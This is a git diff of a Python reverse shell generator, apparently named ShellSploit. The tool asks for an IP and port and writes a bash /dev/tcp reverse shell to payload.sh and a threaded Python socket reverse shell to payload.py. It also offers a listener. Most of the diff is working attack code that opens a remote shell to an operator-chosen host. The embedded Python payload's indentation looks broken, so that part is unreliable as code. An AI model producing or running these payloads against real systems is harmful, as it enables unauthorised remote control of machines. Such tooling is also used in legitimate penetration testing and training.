@@ -52,12 +52,73 @@ def option_check(choice):
         port = int(input("Enter port: "))
 
         if shell_type == "bash":
-            print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")
+            with open("payload.sh", "w") as file:
+                file.write(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")
+            print("[+] Payload Created")
         elif shell_type == "python":
-            shell = f"""
-            python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
+            payload = f"""
+            import os,socket,subprocess,threading;
+                def s2p(s, p):
+                    while True:
+                        data = s.recv(1024)
+                        if len(data) > 0:
+                            p.stdin.write(data)
+                            p.stdin.flush()
+
+                def p2s(s, p):
+                    while True:
+                        s.send(p.stdout.read(1))
+
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect(("{ip}",{port}))
+
+                p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+                s2p_thread = threading.Thread(target=s2p, args=[s, p])
+                s2p_thread.daemon = True
+                s2p_thread.start()
+
+                p2s_thread = threading.Thread(target=p2s, args=[s, p])
+                p2s_thread.daemon = True
+                p2s_thread.start()
+
+                try:
+                    p.wait()
+                except KeyboardInterrupt:
+                    s.close()
             """
-            print(shell)
+            with open("payload.py", "w") as file:
+                file.write(f"""
+                import os,socket,subprocess,threading;
+                    def s2p(s, p):
+                        while True:
+                            data = s.recv(1024)
+                            if len(data) > 0:
+                                p.stdin.write(data)
+                                p.stdin.flush()
+
+                    def p2s(s, p):
+                        while True:
+                            s.send(p.stdout.read(1))
+
+                    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                    s.connect(("{ip}",{port}))
+
+                    p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+                    s2p_thread = threading.Thread(target=s2p, args=[s, p])
+                    s2p_thread.daemon = True
+                    s2p_thread.start()
+
+                    p2s_thread = threading.Thread(target=p2s, args=[s, p])
+                    p2s_thread.daemon = True
+                    p2s_thread.start()
+
+                    try:
+                        p.wait()
+                    except KeyboardInterrupt:
+                        s.close()
+    """)
         else:
             print("[!] Unknown shell type.")
             return
@@ -65,7 +126,8 @@ def option_check(choice):
     elif choice == "2":
         port = int(input("Enter port to listen on: "))
         listen("0.0.0.0", port)
-
+    elif choice in ("exit", "quit"):
+        exit()
     else:
         print("[!] Invalid option.")
 
@@ -75,7 +137,7 @@ Options:
 2. Listener
 """
 logo = Fore.MAGENTA + r"""
-  ██████  ██░ ██ ▓█████  ██▓     ██▓      ██████  ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓
+  ██████  ██░ ██ ▓█████  ██▓     ██▓      ██████  ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓  
 ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    ▒██    ▒ ▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒
 ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    ░ ▓██▄   ▓██░ ██▓▒▒██░    ▒██░  ██▒▒██▒▒ ▓██░ ▒░
   ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░      ▒   ██▒▒██▄█▓▒ ▒▒██░    ▒██   ██░░██░░ ▓██▓ ░ 
@@ -83,20 +145,25 @@ logo = Fore.MAGENTA + r"""
 ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▓    ▒ ░░   
 ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░░ ░▒  ░ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ▒ ░    ░    
 ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   ░  ░  ░  ░░         ░ ░   ░ ░ ░ ▒   ▒ ░  ░      
-      ░   ░  ░  ░   ░  ░    ░  ░    ░  ░      ░               ░  ░    ░ ░   ░           
-                                                                                        
+      ░   ░  ░  ░   ░  ░    ░  ░    ░  ░      ░               ░  ░    ░ ░   ░            
+
+▗▖  ▗▖▄▄▄▄ 
+▐▌  ▐▌   █ 
+▐▌  ▐▌█▀▀▀ 
+ ▝▚▞▘ █▄▄▄ 
 """
 
 username = getpass.getuser()
 print(logo)
-print("- Made By GdevMan\n -My GH - https://github.com/GdevMan")
+print("- Made By GdevMan\n- My GH -> https://github.com/GdevMan")
 print(legal_warning)
 print(options_menu)
 
 def main():
     while True:
         try:
-            choice = input(Fore.GREEN + f"[{username}@localhost] ~ $ ")
+            thing_shell = f"""┌─── {username}\n└ ~ $ """
+            choice = input(Fore.GREEN + thing_shell)
             option_check(choice)
         except KeyboardInterrupt:
             print("\n[!] User Quit")
@@ -104,3 +171,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
